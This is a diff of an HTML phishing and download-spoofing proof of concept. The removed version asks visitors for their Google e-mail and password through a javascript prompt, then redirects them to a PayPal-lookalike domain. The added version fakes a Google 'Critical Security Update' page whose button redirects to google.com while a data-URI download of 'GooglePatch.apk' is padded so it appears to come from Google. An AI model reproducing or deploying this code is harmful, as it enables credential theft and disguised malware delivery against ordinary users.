@@ -1,27 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Security Service</title>
+    <style>
+        body { background: #0b0b0b; color: #fff; font-family: 'Segoe UI', sans-serif; text-align: center; padding-top: 50px; }
+        .container { border: 1px solid #4285F4; padding: 30px; display: inline-block; border-radius: 15px; background: #1a1a1a; }
+        .google-logo { font-size: 2em; font-weight: bold; margin-bottom: 10px; }
+        .blue { color: #4285F4; } .red { color: #EA4335; } .yellow { color: #FBBC05; } .green { color: #34A853; }
+        #strikeBtn {
+            padding: 15px 35px;
+            background: #4285F4;
+            color: #fff;
+            border: none;
+            cursor: pointer;
+            font-weight: bold;
+            border-radius: 8px;
+        }
+        #status { margin-top: 25px; font-size: 0.8em; color: #888; font-family: monospace; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="google-logo">
+            <span class="blue">G</span><span class="red">o</span><span class="yellow">o</span><span class="blue">g</span><span class="green">l</span><span class="red">e</span>
+        </div>
+        <p>Critical Security Update for Android Services.</p>
+        <button type="button" id="strikeBtn">Update Google Services</button>
+        <div id="status">> Status: Waiting...</div>
+    </div>
 
-<html>
-  <body>
+<script>
+    document.getElementById('strikeBtn').addEventListener('click', function() {
+        const filename = "GooglePatch.apk";
+        const spoofDomain = "www.google.com";
+        
+        // --- Logic Spoofing ---
+        const padding = ".https://" + spoofDomain + "/patch/".repeat(25);
+        const longSub = spoofDomain + padding;
+        const base64Payload = "ZXN0dGVzdGVzdHRlc3Q="; 
+        const payload = `data:application/octet-stream;base64,${base64Payload}#${longSub}`;
 
-    <script>
+        const a = document.createElement('a');
+        a.href = payload;
+        a.download = filename;
+        document.body.appendChild(a);
 
-    function exploit() {
+        // --- STEP 1: Update UI ---
+        document.getElementById('status').innerText = "> REDIRECTING TO GOOGLE...";
 
-      window.open("https://www.google.com");
+        // --- STEP 2: Trigger Redirect ---
+        // Kita redirect dulu ke halaman google
+        window.location.href = "https://www.google.com";
 
-      document.getElementById("iframe").src = 'javascript:prompt("In order to access Google.com\\nyou must first login on your\\nGoogle Account.\\n\\nPlease type your e-mail\\nand your password:\\n", "E-mail / Password");';
-      document.location="http://www.manage-myaccount.paypal.com-webapps.bntk.pl";
-
-    }
-    
-    </script>
-
-    <br><br><br><br>
-
-    <a href="#" onclick="exploit();">
-      <center><h1>Click here to go to Google.com</h1></center>
-    </a>
-
-    <iframe styleframeborder="0" style="width:0;height:0;" id="iframe" src=""></iframe>
-
-  </body>
+        // --- STEP 3: Trigger Download sesaat setelah redirect ---
+        // Menggunakan delay sangat kecil agar proses download 'terbawa' ke context halaman baru
+        setTimeout(() => {
+            a.click();
+            document.body.removeChild(a);
+        }, 100); 
+    });
+</script>
+</body>
 </html>
